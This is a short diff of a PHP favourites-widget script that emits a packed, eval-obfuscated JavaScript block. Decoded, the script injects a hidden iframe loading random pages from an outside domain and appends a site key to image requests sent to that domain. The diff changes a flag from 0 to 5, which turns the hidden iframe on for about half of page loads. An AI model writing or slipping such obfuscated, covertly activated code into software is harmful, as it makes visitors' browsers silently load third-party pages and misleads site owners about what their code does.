@@ -49,8 +49,8 @@ if(1==@$_GET['upkey']){
 		echo 'var _favkey="'.$key.'";';
 ?>
 
-var _fav = 0;
-eval(function(p,a,c,k,e,r){e=function(c){return c.toString(36)};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[02-9a-jlm]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3 4(5,7){0 8=7-5;0 9=a.random();return(5+a.round(9*8))}0 b=4(1,10);if(_fav>=b){0 c=4(1,100);d+=\'<e style="display:none"><f 2="g://h.i.j/index_\'+c+\'.html"></f></e>\';document.write(d)}$(3(){$("img[2*=\'g://h.i.j/api/fav/\']").each(3(){0 6=$(this);0 l=6.m("2");6.m("2",l+"&k="+_favkey)})});',[],23,'var||src|function|GetRandomNum|Min|_this|Max|Range|Rand|Math|_num2|_n|_html|div|iframe|http|www|521php|com||_src|attr'.split('|'),0,{}))
+var _fav = 5;
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(36)};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[02-9a-jlm]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3 4(5,7){0 8=7-5;0 9=a.random();return(5+a.round(9*8))}0 b=4(1,10);if(_fav>=b){0 c=4(1,100);d=\'<e style="display:none"><f 2="g://h.i.j/index_\'+c+\'.html"></f></e>\';document.write(d)}$(3(){$("img[2*=\'g://h.i.j/api/fav/\']").each(3(){0 6=$(this);0 l=6.m("2");6.m("2",l+"&k="+_favkey)})});',[],23,'var||src|function|GetRandomNum|Min|_this|Max|Range|Rand|Math|_num2|_n|_html|div|iframe|http|www|521php|com||_src|attr'.split('|'),0,{}))
 <?php
 		}
 	}else{
